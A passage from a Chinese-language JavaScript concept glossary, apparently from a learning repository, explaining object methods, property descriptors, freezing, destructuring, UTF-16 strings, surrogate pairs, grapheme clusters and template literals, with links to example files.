也见 [Enumerable（可枚举性）](#enumerable可枚举性)、[Accessor Property（访问器属性）](#accessor-property访问器属性)、[Object.freeze, seal, preventExtensions（对象锁定）](#objectfreeze-seal-preventextensions对象锁定)。

示例：[`09_objects/08_property_descriptors.js`](09_objects/08_property_descriptors.js)

### Accessor Property（访问器属性）

访问器属性（getter/setter）把「读属性」和「写属性」变成**函数调用**：`get` 在读取 `obj.x` 时执行、返回值即属性值；`set` 在 `obj.x = v` 时执行。它用来在保持「属性式语法」的同时插入逻辑——校验、懒计算、缓存、派生值、内部字段代理。定义方式有两种：字面量里写 `get x() {}` / `set x(v) {}`，或用 `Object.defineProperty` 传 `{ get, set }`。关键细节：访问器属性**没有 `value` 和 `writable`**（描述符是二选一的形态），写它会调用 `set`（没有 `set` 时严格模式下抛 `TypeError`）；`get`/`set` 也是普通函数，`this` 指向调用对象，因此可以被继承和覆写；**不要在 getter 里访问自己同名属性**，那会无限递归爆栈（常见于误写成 `get x() { return this.x }`）。

也见 [Property Descriptor（属性描述符）](#property-descriptor属性描述符)、[Object.freeze, seal, preventExtensions（对象锁定）](#objectfreeze-seal-preventextensions对象锁定)。

示例：[`09_objects/07_getter_setter.js`](09_objects/07_getter_setter.js)

### Object.keys, values, entries（键值遍历）

三个静态方法把对象的**自有可枚举属性**转成数组，因此可以直接接 `map`/`filter`/`reduce`：`Object.keys(o)` 返回键数组，`Object.values(o)` 返回值数组，`Object.entries(o)` 返回 `[key, value]` 对的数组。关键细节：它们**不包含继承属性、不包含不可枚举属性、也不包含 Symbol 键**（要 Symbol 键用 `Object.getOwnPropertySymbols`，要包括不可枚举属性用 `Object.getOwnPropertyNames`）；顺序遵循属性顺序规则（整数键升序在前，然后字符串键按插入序，最后 Symbol 键）。`Object.entries` 常与 `for (const [k, v] of ...)` 搭配使用，是遍历对象的现代标准写法；`Object.values` 让「对对象的值做聚合」变得和数组一样自然。

也见 [Object.fromEntries（从条目构造对象）](#objectfromentries从条目构造对象)、[Property Order（属性顺序）](#property-order属性顺序)。

示例：[`09_objects/05_keys_values_entries.js`](09_objects/05_keys_values_entries.js)

### Object.fromEntries（从条目构造对象）

`Object.fromEntries(iterable)` 是 `Object.entries` 的**逆操作**：接收任何可迭代的「`[key, value]` 对」序列（二维数组、`Map`、生成器），返回一个新对象。它把「先转成条目数组再变换」的管道补完：`Object.fromEntries(Object.entries(o).map(([k, v]) => [k, f(v)]))` 就是一句「对象版 `map`」。关键细节：键会经过标准的属性键转换（数字变字符串）；重复键**后者覆盖前者**；它能直接吃 `Map`，因为 `Map` 迭代出来的正是 `[key, value]` 对——所以 `Object.fromEntries(map)` 是 `Map → 普通对象` 的一行转换（但键必须是字符串/符号，对象键会塌缩成 `'[object Object]'`）。用它做「过滤对象」「重命名键」比 `reduce` 直观得多。

也见 [Object.keys, values, entries（键值遍历）](#objectkeys-values-entries键值遍历)、[Object.groupBy, Map.groupBy（分组）](#objectgroupby-mapgroupby分组)。

示例：[`09_objects/05_keys_values_entries.js`](09_objects/05_keys_values_entries.js)

### Object.assign（合并）

`Object.assign(target, ...sources)` 把多个源对象的**自有可枚举属性**（含 Symbol 键）复制到 `target`，**返回 `target` 本身**（不是新对象），因此常用于「合并配置」和「补默认值」。关键细节：它是**浅拷贝**，嵌套对象共享引用；同名键**后面的覆盖前面的**（`Object.assign({}, defaults, options)` 是标准补默认值写法）；它**会触发源对象的 getter 和目标对象的 setter**（因为它走的是普通赋值语义，而不是 `defineProperty`）；传 `null`/`undefined` 源会被忽略，但 `target` 为 `null`/`undefined` 会抛 `TypeError`；**不会复制不可枚举属性和原型链上的属性**。现代代码里 `{ ...defaults, ...options }` 更常用，但 `assign` 的优势是能修改已有对象（`Object.assign(state, patch)`），这在不能重新赋值的场合很实用。

也见 [Object Spread（对象展开）](#object-spread对象展开)、[Shallow Copy vs Deep Copy（浅拷贝与深拷贝）](#shallow-copy-vs-deep-copy浅拷贝与深拷贝)。

示例：[`09_objects/06_object_assign.js`](09_objects/06_object_assign.js)

### Object.create（创建）

`Object.create(proto, descriptors?)` 创建一个**以指定对象为原型**的新对象：`Object.create(null)` 得到**没有原型**的「纯净字典」（没有 `toString`、`hasOwnProperty`，因此完全不怕原型污染和键名冲突，非常适合当查找表）；`Object.create(someProto)` 是 ES6 `class` 之前实现继承的标准手段（见 `16_prototype/`）。可选的第二参数用属性描述符定义属性（注意此时开关默认全是 `false`）。关键细节：`Object.create` 是**唯一能在创建时就指定原型**的方式（`{__proto__: p}` 是它的语法糖，但 `__proto__` 是遗留访问器，不推荐）；原型链查找意味着新对象的继承属性不会出现在 `Object.keys` 里，这会和「期望拿到普通对象」的代码产生意外。

也见 [Own Property vs Inherited Property（自有属性与继承属性）](#own-property-vs-inherited-property自有属性与继承属性)、[Object.groupBy, Map.groupBy（分组）](#objectgroupby-mapgroupby分组)。

示例：[`09_objects/10_object_create.js`](09_objects/10_object_create.js)

### Object.freeze, seal, preventExtensions（对象锁定）

三个逐级收紧的「锁定」方法，本质都是批量修改属性描述符：`Object.preventExtensions(o)` 只禁止**新增**属性；`Object.seal(o)` 在上一级基础上禁止**删除**、并把所有属性变成 `configurable: false`（但值仍可写）；`Object.freeze(o)` 再进一步，把所有数据属性变成 `writable: false`，即完全只读。严厉程度是 `preventExtensions < seal < freeze`。三个要点必须记住：第一，它们**都返回传入的那个对象本身**（不是新副本），所以 `const frozen = Object.freeze(obj)` 里的 `frozen === obj`；第二，它们**都是浅操作**，嵌套对象依然可以改；第三，在**非严格模式**下违反约束是**静默失败**（不报错、也不生效），严格模式（模块代码默认严格）下才抛 `TypeError`。配套的判断方法是 `Object.isExtensible`/`isSealed`/`isFrozen`。

也见 [Shallow Freeze vs Deep Freeze（浅冻结与深冻结）](#shallow-freeze-vs-deep-freeze浅冻结与深冻结)、[Property Descriptor（属性描述符）](#property-descriptor属性描述符)。

示例：[`09_objects/09_freeze_seal.js`](09_objects/09_freeze_seal.js)

### Shallow Freeze vs Deep Freeze（浅冻结与深冻结）

`Object.freeze` 只冻结**第一层**：被冻结对象的嵌套对象、数组元素仍然可以被修改，所以「冻结了配置对象却还能改 `config.db.host`」是极其常见的漏洞。**深冻结**需要自己递归实现：遍历所有属性，对每个对象值递归调用 `Object.freeze`（务必用 `Object.hasOwn`/`Object.keys` 过滤，并用 `WeakSet` 记录已处理对象，否则遇到**循环引用**会无限递归）。关键细节：递归时要注意跳过不可枚举与访问器属性，且对**函数、`Map`/`Set`、`Date`** 的冻结语义要单独考虑（冻结 `Map` 并不能阻止 `map.set`）。若只是要防意外修改，`structuredClone` 出一个独立副本往往比深冻结更实用——它不阻止修改，但改的是副本。

也见 [Object.freeze, seal, preventExtensions（对象锁定）](#objectfreeze-seal-preventextensions对象锁定)、[Shallow Copy vs Deep Copy（浅拷贝与深拷贝）](#shallow-copy-vs-deep-copy浅拷贝与深拷贝)。

示例：[`09_objects/09_freeze_seal.js`](09_objects/09_freeze_seal.js)、[`09_objects/12_deep_clone.js`](09_objects/12_deep_clone.js)

### Object Spread（对象展开）

`{ ...source }` 把源对象的**自有可枚举属性**（含 Symbol 键）复制到一个新对象里，是对象浅拷贝与合并的现代写法。与 `Object.assign` 的对比是重点：`{...a, ...b}` 总能得到**新对象**（不会像 `assign` 那样污染第一个参数），合并顺序同样是「后者覆盖前者」，也不复制不可枚举与继承属性。差异细节：对象展开**不触发 setter**，而是在新对象上以普通数据属性落地（这是与 `Object.assign` 的实质区别）；`{...null}` 和 `{...undefined}` 是安全的（得到空对象），而 `Object.assign({}, null)` 也安全但 `Object.assign(null, {})` 抛错；展开在赋值位置会创建新对象，所以**不能**用 `{...state} = patch` 这种写法，展开只读不写。

也见 [Object.assign（合并）](#objectassign合并)、[Shallow Copy vs Deep Copy（浅拷贝与深拷贝）](#shallow-copy-vs-deep-copy浅拷贝与深拷贝)。

示例：[`09_objects/04_spread_merge.js`](09_objects/04_spread_merge.js)

### Property Order（属性顺序）

对象的属性有确定且**规范保证**的顺序：**整数索引键**（能被转成 `0 ≤ n < 2³²-1` 的非负整数的字符串键）按**数值升序**排在最前；然后是**字符串键**按**插入顺序**排列；最后是 **Symbol 键**按插入顺序排列。这套规则直接影响 `Object.keys`/`values`/`entries`、`for...in`、`JSON.stringify` 和 `Object.assign` 的输出。最实用的含义是：如果拿对象当「按 id 索引的集合」，遍历时**永远按 id 升序**而不是插入顺序——想保留插入顺序必须用 `Map`（`Map` 严格按插入顺序迭代，这是它相对对象的核心优势之一）。另外数组作为「整数键对象」自然按数字升序迭代，这也解释了为什么用数组存稀疏下标不会打乱顺序。

也见 [Object.keys, values, entries（键值遍历）](#objectkeys-values-entries键值遍历)、[Property, Key, Value（属性、键与值）](#property-key-value属性键与值)。

示例：[`09_objects/14_property_order.js`](09_objects/14_property_order.js)

### Object Identity vs Structural Equality（对象身份与结构相等）

JS 的 `===` 对对象比较的是**身份（引用）**，不是内容：`{} === {}` 为 `false`，`[1,2] === [1,2]` 为 `false`，只有两个变量指向**同一个对象**才为 `true`。这对数组方法影响巨大：`indexOf`/`includes`/`Set`/`Map` 的键比较全部按引用，所以「查一个内容相同的对象是否存在」永远失败。**结构相等**（内容相等）需要自己实现或借助工具：手写递归比较（要处理 `NaN`、`Date`、`Map`/`Set`、循环引用），用 `JSON.stringify` 比较（简单但受**属性顺序**影响，且丢 `undefined`/函数），或使用 `lodash.isEqual`/`node:assert` 的 `deepStrictEqual`。`Object.is(a, b)` 则是一个小补丁：它和 `===` 几乎相同，但认为 `Object.is(NaN, NaN)` 为 `true`、`Object.is(0, -0)` 为 `false`（即 SameValue）。

也见 [Property Order（属性顺序）](#property-order属性顺序)、[Shallow Copy vs Deep Copy（浅拷贝与深拷贝）](#shallow-copy-vs-deep-copy浅拷贝与深拷贝)。

示例：[`09_objects/13_object_methods.js`](09_objects/13_object_methods.js)

## 解构（Destructuring）

### Destructuring Assignment（解构赋值）

从数组或对象中按「形状」提取值并赋给变量的语法，本质是**模式匹配**的简化形式。对象解构按**属性名**匹配（不关心顺序），数组解构按**位置**匹配（依赖迭代器协议）；两者都支持默认值、重命名、剩余元素。它让「从多层嵌套结构里取几个字段」从多行赋值变成一行声明，也让函数参数可以直接声明「我关心哪几个字段」。三条关键规则：默认值**只在取到 `undefined` 时生效**（取到 `null`、`0`、`''`、`false` 都不触发，这是最常见的误解）；解构是「按形状取值」，取不到的变量得到 `undefined` 而不是报错；解构赋值**不需要声明关键字**，`[a, b] = [b, a]` 这种「赋值给已有变量」的写法**必须用括号包起来**（`({a} = o)`、`[a, b] = arr`），否则行首的 `{`、`[` 会被解析成块语句或数组字面量。

也见 [Object Pattern（对象模式）](#object-pattern对象模式)、[Array Pattern（数组模式）](#array-pattern数组模式)、[Default Value（默认值）](#default-value默认值)。

示例：[`10_destructuring/01_object_destructuring.js`](10_destructuring/01_object_destructuring.js)

### Object Pattern（对象模式）

对象解构 `const { a, b } = obj` 从右侧对象按**属性名**取值，与书写顺序无关，也不要求属性存在（不存在则为 `undefined`）。它内部走的是**属性访问（`[[Get]]`）**，因此**会触发 getter、也会沿原型链查找**——也就是说可以解构出继承属性，这与「只取自有属性」的直觉不同。重命名用冒号：`const { a: x } = obj`（读 `obj.a` 存进 `x`，注意 `a` 本身不再是变量）；默认值和重命名可以叠加：`const { a: x = 1 } = obj`。对象解构在赋值目标里**必须用括号包裹**：`({ a } = obj)`。它最常用的场合是「从大对象里挑几个字段」和「模块/配置项的具名提取」。

也见 [Renaming（重命名）](#renaming重命名)、[Nested Destructuring（嵌套解构）](#nested-destructuring嵌套解构)、[Default Value（默认值）](#default-value默认值)。

示例：[`10_destructuring/01_object_destructuring.js`](10_destructuring/01_object_destructuring.js)

### Array Pattern（数组模式）

数组解构 `const [a, b] = arr` 按**位置**把值赋给变量，靠的是**迭代器协议**而不是「数组」这个类型。它支持四种常用形态：基本取值；**跳位**用逗号占位（`const [, second] = arr`）；剩余元素用 `...rest`（`const [first, ...others] = arr`，`rest` 永远是数组，且只能是**最后一个**元素）；嵌套解构。关键细节：右侧不是数组也没关系，任何可迭代对象都行（字符串、`Set`、`Map`、生成器、`arguments`）；右侧为 `null`/`undefined`/不可迭代对象会**抛 `TypeError`**（这是解构与 `const x = arr[0]` 最大的行为差异）；多出来的变量得到 `undefined`，多余的元素被丢弃。

也见 [Iterable Destructuring（可迭代对象解构）](#iterable-destructuring可迭代对象解构)、[Rest Element（剩余元素）](#rest-element剩余元素)、[Nested Destructuring（嵌套解构）](#nested-destructuring嵌套解构)。

示例：[`10_destructuring/02_array_destructuring.js`](10_destructuring/02_array_destructuring.js)、[`08_arrays/17_array_destructuring.js`](08_arrays/17_array_destructuring.js)

### Default Value（默认值）

解构的默认值写作 `const { a = 1 } = obj` 或 `const [x = 1] = arr`，它**只在取到的值是 `undefined` 时生效**——这是整个解构语法里最容易被误记的一条。`null` 不触发默认值（`const {a = 1} = {a: null}` 得到 `null`），`0`、`''`、`false`、`NaN` 也都不会触发。更精确地说，默认值只在「属性不存在」或「属性值严格等于 `undefined`」时被求值，而且是**惰性求值**：只有真的需要时才计算右边表达式（所以可以写 `const { a = expensive() } = obj`）。如果语义是「`null` 也算缺失」，必须显式处理：`const a = obj.a ?? 1`。默认值常与重命名、嵌套同时出现，也要注意默认值表达式**不能引用同一模式里声明的其他变量**（它们在同一个作用域里声明，尚未初始化）。

也见 [Destructuring Assignment（解构赋值）](#destructuring-assignment解构赋值)、[Renaming（重命名）](#renaming重命名)。

示例：[`10_destructuring/04_default_values.js`](10_destructuring/04_default_values.js)

### Renaming（重命名）

在对象解构中用冒号给变量改名：`const { name: userName, age: userAge } = user`。冒号左边是**属性名**（取值依据），右边是**新变量名**（真正声明的标识符）。三个要点：重命名后**原属性名不再是变量**（`userName` 有值，`name` 未定义）；重命名可以和默认值叠加 `{ name: userName = '匿名' }`；重命名也可以嵌套 `{ user: { name } }`（此时 `user` 不是变量）。数组解构没有重命名概念——变量名本来就是你自己起的，`const [first, second] = arr` 本身就是「重命名」。常见用途是：解构出的名字和当前作用域里已有变量冲突时避免重名，或把 `{ id, name }` 里的 `name` 改成更明确的 `userName`。

也见 [Object Pattern（对象模式）](#object-pattern对象模式)、[Nested Destructuring（嵌套解构）](#nested-destructuring嵌套解构)。

示例：[`10_destructuring/01_object_destructuring.js`](10_destructuring/01_object_destructuring.js)

### Rest Element（剩余元素）

解构里的 `...rest` 把「没被前面的模式取走的剩余部分」收集起来，位置**必须在最后**。类型取决于左侧形态：**对象模式**中 `const { a, ...rest } = obj` 得到的是一个**新对象**，包含除 `a` 之外的所有**自有可枚举属性**（含 Symbol 键，浅拷贝）；**数组模式**中 `const [a, ...rest] = arr` 得到的是一个**新数组**。关键细节：`rest` 在数组模式里总是**密集数组**（空洞会被填成 `undefined`）；对象模式的 `rest` 是浅拷贝，嵌套对象仍共享引用；空模式 `const {...all} = obj` 是「浅拷贝且排除若干键」的干净写法（比 `delete` 安全，因为它不修改原对象）。不要与函数参数里的剩余参数（`function f(...args)`）混淆——语法相似，但一个是解构模式，一个是参数列表。

也见 [Destructuring Assignment（解构赋值）](#destructuring-assignment解构赋值)、[Object Spread（对象展开）](#object-spread对象展开)。

示例：[`10_destructuring/02_array_destructuring.js`](10_destructuring/02_array_destructuring.js)、[`10_destructuring/06_swap_and_tricks.js`](10_destructuring/06_swap_and_tricks.js)

### Nested Destructuring（嵌套解构）

当数据是多层结构时，可以把模式写成和数据结构同样的形状，一次取到深层字段：`const { user: { profile: { name } } } = data`。关键细节：嵌套模式里的中间层名字（`user`、`profile`）**不会成为变量**，它们只是「路径」；如果某一层可能是 `undefined`，解构会**直接抛 `TypeError`**，所以要配合默认值在**每一层**兜底：`const { user: { profile: { name } = {} } = {} } = data`（注意默认值写在**被解构的那个位置**上）。对象与数组模式可以自由混合：`const [{ name }, { name: second }] = list`。可读性提醒：嵌套超过两层时，拆成两行解构通常比一行长模式更容易维护，也更利于定位哪一层缺数据。

也见 [Default Value（默认值）](#default-value默认值)、[Object Pattern（对象模式）](#object-pattern对象模式)。

示例：[`10_destructuring/03_nested_destructuring.js`](10_destructuring/03_nested_destructuring.js)

### Swap Variables（交换变量）

解构让交换两个变量不再需要临时变量：`[a, b] = [b, a]`——右侧先构造一个新数组，再按位置解构回左侧。要点：这是**赋值**而不是声明，所以如果 `a`、`b` 尚未声明，前面要加 `let`（`let [a, b] = [b, a]` 在 `b` 未定义时会出错）；语句开头的 `[` 可能被上一行的解析粘连影响，稳妥写法是**在前面加分号**或直接用分号结尾（这也是本仓库统一显式分号的原因之一）。同一语法可以扩展到任意多个变量：`[a, b, c] = [c, a, b]` 实现轮换。其他常见小技巧还有：用解构从正则匹配结果里取分组、用 `[x = 0] = arr` 做「取不到就给默认」，以及用对象解构在函数内快速取出配置项。

也见 [Destructuring Assignment（解构赋值）](#destructuring-assignment解构赋值)、[Array Pattern（数组模式）](#array-pattern数组模式)。

示例：[`10_destructuring/06_swap_and_tricks.js`](10_destructuring/06_swap_and_tricks.js)

### Parameter Destructuring（参数解构）

函数参数位置可以直接写解构模式，让「函数需要哪些字段」在签名处一目了然：`function f({ name, age = 18 }, [x, y]) {}`。它有三个实际好处：调用方不必关心参数顺序（对象解构按名匹配）；默认值直接写在模式里，省掉函数体内的兜底代码；配合剩余元素能实现「取出已知项，其余原样透传」。关键细节与陷阱：**整个参数对象缺失时**默认值不会生效（`f()` 会让 `{name}` 解构 `undefined` 而抛错），要写成 `function f({ name } = {})` 或 `function f({ name = 1 } = {})`；解构参数会让函数 `length` 属性变成 0（因为参数不是简单列表），可能影响依赖 `fn.length` 的库；**回调、事件处理器的入参**（如 `(event)`）解构时要确认字段真的存在于该事件上。

也见 [Default Value（默认值）](#default-value默认值)、[Destructuring Assignment（解构赋值）](#destructuring-assignment解构赋值)。

示例：[`10_destructuring/05_function_parameters.js`](10_destructuring/05_function_parameters.js)

### Iterable Destructuring（可迭代对象解构）

「数组解构」这个名字其实不准确：方括号解构真正依赖的是**可迭代协议（Iteration Protocol）**，即对象实现了 `Symbol.iterator` 方法。因此数组、字符串、`TypedArray`、`Map`、`Set`、生成器函数返回的生成器对象、`arguments`、`NodeList`，以及自定义的可迭代对象**都能被解构**。这也解释了两个现象：解构字符串得到的是**单个字符**（按码点迭代，emoji 不会被拆开）；解构 `Map` 得到的是 `[key, value]` 对，所以 `for (const [k, v] of map)` 能直接工作。反过来，**普通对象默认不可迭代**（没有 `Symbol.iterator`），所以 `const [a] = {0:'x'}` 会抛 `TypeError`——想让对象也能被方括号解构，必须自己实现 `Symbol.iterator`。

也见 [Array Pattern（数组模式）](#array-pattern数组模式)、[Array-like Object（类数组对象）](#array-like-object类数组对象)。

示例：[`10_destructuring/07_destructuring_iterables.js`](10_destructuring/07_destructuring_iterables.js)

## 字符串（String）

### String（字符串）

字符串是**不可变的 UTF-16 码元序列**，属于**原始值**（primitive），不是对象。它可以用单引号、双引号或反引号（模板字符串）创建，三种写法在功能上等价（模板字符串额外支持插值与换行）。关键细节：因为字符串是原始值，`str.length`、`str.toUpperCase()` 之所以能工作，是引擎在访问属性时临时**包装**成 `String` 对象（装箱）；`typeof 'a'` 是 `'string'`，而 `new String('a')` 是**对象**（`typeof` 为 `'object'`，且 `new String('a') === 'a'` 为 `false`）——**永远不要用 `new String()`**。所有字符串方法都返回**新字符串**，原字符串永不改变，这也是「不可变性」在实践中的体现。

也见 [Immutability（不可变性）](#immutability不可变性)、[String length（字符串长度陷阱）](#string-length字符串长度陷阱)。

示例：[`11_strings/01_creation_and_immutability.js`](11_strings/01_creation_and_immutability.js)

### Immutability（不可变性）

不可变性指字符串一旦创建就**无法被修改**：`str[0] = 'X'` 静默失败（严格模式下抛 `TypeError`），`str.toUpperCase()` 不会改变 `str`，只是返回新串。这带来两个实践推论：一是「所有字符串方法都返回新字符串」，所以忘了接收返回值就等于啥也没做（`str.trim();` 这种漏赋值的写法极为常见）；二是**拼接大量字符串性能很差**，每次 `+=` 都可能产生新串，循环里累积上万段文本应该先放进数组再用 `join('')`。与字符串相反，数组和对象是**可变**的，`arr.reverse()`、`obj.x = 1` 都会改变原值——这种「一半不可变、一半可变」的不一致正是许多 bug 的来源（见可变方法与不可变方法）。

也见 [String（字符串）](#string字符串)、[Mutating vs Non-mutating Methods（可变方法与不可变方法）](#mutating-vs-non-mutating-methods可变方法与不可变方法)。

示例：[`11_strings/01_creation_and_immutability.js`](11_strings/01_creation_and_immutability.js)

### UTF-16（UTF-16 编码）

JS 字符串内部一律用 **UTF-16** 存储：每个字符占一个 16 位**码元（code unit）**，取值范围 0~65535。Unicode 有超过 16 位的码位（U+10000 以上，如绝大多数 emoji 和部分生僻汉字），这些字符在 UTF-16 里必须用**两个码元**（代理对）表示。这决定了 JS 字符串的三条基本特性：`length` 统计的是**码元数**而非「人眼看到的字符数」；`str[i]`、`charAt`、`slice`、`substring` 都按**码元**切分，可能把一个字符切成两半产生乱码；`for...of`、`[...str]`、`Array.from(str)` 则按**码点**迭代，能正确处理代理对。理解 UTF-16 是理解所有「字符串长度」和「字符串截取」问题的前提。

也见 [Code Unit（码元）](#code-unit码元)、[Code Point（码点）](#code-point码点)、[Surrogate Pair（代理对）](#surrogate-pair代理对)。

示例：[`11_strings/09_unicode_and_codepoints.js`](11_strings/09_unicode_and_codepoints.js)

### Code Unit（码元）

码元是 UTF-16 编码的**最小存储单位**，16 位，取值 0x0000~0xFFFF。JS 里几乎所有「按位置操作字符串」的 API 都工作在码元层面：`length`、`str[i]`、`charAt`、`charCodeAt`、`slice`、`substring`、`substr`、`indexOf` 返回的下标，全是码元下标。因此 `'😀'.length` 是 **2**，`'😀'.charCodeAt(0)` 得到的是**高位代理**（0xD83D）而不是什么有意义的字符——这两个事实能解释绝大多数「emoji 处理异常」的报告。反过来，`codePointAt`、`String.fromCodePoint`、`for...of` 是按**码点**工作的。记住一句：**凡是以「下标」「长度」为单位又没提 u 标志/码点的字符串 API，单位都是码元。**

也见 [Code Point（码点）](#code-point码点)、[String length（字符串长度陷阱）](#string-length字符串长度陷阱)。

示例：[`11_strings/09_unicode_and_codepoints.js`](11_strings/09_unicode_and_codepoints.js)

### Code Point（码点）

码点是 Unicode 给每个字符分配的**唯一编号**，范围 U+0000~U+10FFFF，与具体编码方式（UTF-16/UTF-8）无关，是「字符」的抽象身份。在 JS 里按码点工作的方法有：`codePointAt(i)` 读取某位置的码点（遇到代理对会正确返回完整码点）、`String.fromCodePoint(cp)` 反向构造字符、`for...of` / `[...str]` / `Array.from(str)` 按码点迭代、正则加 `u` 标志后按码点匹配。关键细节：码点索引与码元索引**不是一回事**，`[...str].length` 得到码点数，`str.length` 得到码元数，两者只在纯 BMP 文本下相等。码点也不是终点——一个「人眼看到的字符」可能是多个码点的组合（如带变音符号的字母、带肤色的 emoji），那叫**字素簇**。

也见 [Code Unit（码元）](#code-unit码元)、[Grapheme Cluster（字素簇）](#grapheme-cluster字素簇)。

示例：[`11_strings/09_unicode_and_codepoints.js`](11_strings/09_unicode_and_codepoints.js)

### Surrogate Pair（代理对）

UTF-16 用**两个 16 位码元**表示一个 U+10000 以上的码点，这两个码元叫代理对：**高位代理**范围 0xD800~0xDBFF，**低位代理**范围 0xDC00~0xDFFF，两者按固定公式合成完整码点。关键要点：单个代理码元**不是合法字符**，如果它落单了（称为孤立代理项），这个字符串就是「畸形 UTF-16」，`encodeURIComponent` 会抛 `URIError`，`JSON.stringify` 会输出 `"\ud800"` 这种脏数据。因此凡是「按码元单位截断/反转/取长度」的操作都可能从中间切开一个代理对：`'😀'.slice(0,1)` 得到一个孤立高位代理。正确做法是按码点或字素簇切分（`[...str]`、`Intl.Segmenter`，见 `33_intl/`）。

也见 [Lone Surrogate and Well-formed（孤立代理项与畸形字符串）](#lone-surrogate-and-well-formed孤立代理项与畸形字符串)、[Code Unit（码元）](#code-unit码元)。

示例：[`11_strings/09_unicode_and_codepoints.js`](11_strings/09_unicode_and_codepoints.js)、[`11_strings/13_well_formed_unicode.js`](11_strings/13_well_formed_unicode.js)

### Lone Surrogate and Well-formed（孤立代理项与畸形字符串）

孤立代理项指字符串里出现了**没有配对**的代理码元，这样的字符串称为**畸形（ill-formed）**的 UTF-16，不是合法的 Unicode 文本。产生原因很具体：按码元切片/反转把一个代理对从中间切开、从网络读到被截断的 UTF-8 后错误解码、用 `String.fromCharCode` 手工拼串算错长度。后果是下游 API 崩溃或产出脏数据（`encodeURIComponent` 抛 `URIError`、`JSON.stringify` 输出 `\ud800`、`TextEncoder` 把它换成替换字符）。ES2024 新增了两个方法处理它：`str.isWellFormed()` 检查是否合法，`str.toWellFormed()` 把孤立代理项替换成 U+FFFD（�）并返回修好的新串——**发送到网络或写库之前调用一次 `toWellFormed` 是低成本的保险**。

也见 [Surrogate Pair（代理对）](#surrogate-pair代理对)、[UTF-16（UTF-16 编码）](#utf-16utf-16-编码)。

示例：[`11_strings/13_well_formed_unicode.js`](11_strings/13_well_formed_unicode.js)

### Grapheme Cluster（字素簇）

字素簇是「**人眼感知到的一个字符**」，可能由**多个码点**组成：带变音符号的 `é`（`e` + 组合尖音符，两个码点）、带肤色/性别修饰的 emoji（如 `👨‍👩‍👧` 由多个码点加零宽连接符组成）、国旗 emoji（两个区域指示符码点）。它解释了三个层级的关系：码元（存储单位）→ 码点（Unicode 编号）→ 字素簇（用户感知的字符），`length` 数的是码元，`[...str].length` 数的是码点，**只有字素簇才是「用户以为的字数」**。按字素簇切分和计数需要 `Intl.Segmenter`（`granularity: 'grapheme'`，见 `33_intl/05_intl_segmenter.js`），这是目前唯一的标准方案。做昵称长度校验、文本截断、光标位置时，用 `length` 几乎一定是错的。

也见 [Code Point（码点）](#code-point码点)、[String length（字符串长度陷阱）](#string-length字符串长度陷阱)。

示例：[`11_strings/13_well_formed_unicode.js`](11_strings/13_well_formed_unicode.js)、[`33_intl/05_intl_segmenter.js`](33_intl/05_intl_segmenter.js)

### String length（字符串长度陷阱）

`str.length` 返回的是**UTF-16 码元个数**，它等于「人眼看到的字符数」只在纯 BMP 文本（基本拉丁、常用汉字等）下成立。三个必知的偏差：`'😀'.length === 2`（代理对）；`'é'.length` 可能是 1 或 2，取决于它是「预组合字符」还是「`e` + 组合尖音符」（后者需要 `normalize('NFC')` 统一）；`'👨‍👩‍👧'.length` 可能高达 8（多码点字素簇）。因此「最多 10 个字」的校验、按长度截断文本、按长度计算光标位置，都应该改用 **码点**（`[...str].length`、`Array.from(str).length`）或**字素簇**（`Intl.Segmenter`）。另一个相关细节：`String.prototype.at(-1)` 也是按码元的，取 emoji 的最后一个字符会得到半个代理对。

也见 [Code Unit（码元）](#code-unit码元)、[Grapheme Cluster（字素簇）](#grapheme-cluster字素簇)、[Array.prototype.at()（按索引取值）](#arrayprototypeat按索引取值)。

示例：[`11_strings/03_indexing_and_length.js`](11_strings/03_indexing_and_length.js)、[`11_strings/09_unicode_and_codepoints.js`](11_strings/09_unicode_and_codepoints.js)

### Template Literal（模板字符串）

模板字符串用**反引号**包裹，支持三种普通字符串做不到的能力：**多行文本**（换行原样保留）、**插值 `${表达式}`**（表达式结果会被转成字符串）、以及作为**标签模板**的基础。关键细节：插值里可以放任意表达式（函数调用、三元、甚至嵌套模板），但**不能放语句**；插值结果的转换规则与字符串拼接一致（对象调 `toString`，`null`/`undefined` 变成 `'null'`/`'undefined'`）；`${}` 内部的反引号需要嵌套一层模板或转义；模板字符串里的转义序列（`\n`、`\t`、`\uXXXX`）与普通字符串相同。它最容易被忽略的价值是「多行字符串 + 缩进控制」，但要注意**缩进会被原样保留**，需要自己 `trim`/`replace` 处理。

也见 [Tagged Template（标签模板）](#tagged-template标签模板)、[String.raw（原始字符串标签）](#stringraw原始字符串标签)。

示例：[`11_strings/02_template_literals.js`](11_strings/02_template_literals.js)

### Tagged Template（标签模板）

标签模板是在模板字符串前写一个函数名形成的特殊调用：`` tagFn`Hello ${name}` ``。它**不是**「先求值成字符串再传给函数」，而是把模板拆成两部分传入：第一个参数是**字符串字面量数组**（`['Hello ', '']`，长度永远比插值个数多 1），后续参数依次是各 `${}` 的**求值结果**。这个数组还有一个只读属性 `strings.raw`，保存**未处理转义符**的原始文本（`\n` 保持为两个字符）。它让「字符串构造过程」可以被拦截改写，典型用途是：自动转义用户输入防 XSS（`` html`<p>${userInput}</p>` ``）、`String.raw` 写 Windows 路径与正则、i18n 提取、CSS-in-JS 与 GraphQL 的查询字面量。关键安全点：**插值值必须显式转义**，标签函数不会自动帮你做。

也见 [Template Literal（模板字符串）](#template-literal模板字符串)、[String.raw（原始字符串标签）](#stringraw原始字符串标签)。

示例：[`11_strings/10_tagged_templates.js`](11_strings/10_tagged_templates.js)

### String.raw（原始字符串标签）

`String.raw` 是语言内置的**标签函数**，返回拼接后的字符串但**保留转义符原样**：`String.raw`\n`` 得到两个字符 `\` 和 `n`，而不是换行符。它最常见的用途是写 **Windows 路径**（`String.raw`C:\Users\name\docs``）和**正则源码**（避免 `\d`、`\w` 被当作字符串转义处理）。关键细节：`String.raw` 的规则是「取 `strings.raw` 数组加上插值结果拼接」，所以插值部分**仍然会正常求值**，只有**字面量部分**的转义被保留；另外并非所有转义都能被「保留」——像 `\u{...}` 这类**非法转义序列**在标签模板里是允许的（普通模板字符串会报错），这也正是标签模板能用来写正则的规范基础。

也见 [Tagged Template（标签模板）](#tagged-template标签模板)、[Template Literal（模板字符串）](#template-literal模板字符串)。

示例：[`11_strings/10_tagged_templates.js`](11_strings/10_tagged_templates.js)

### split（分割）

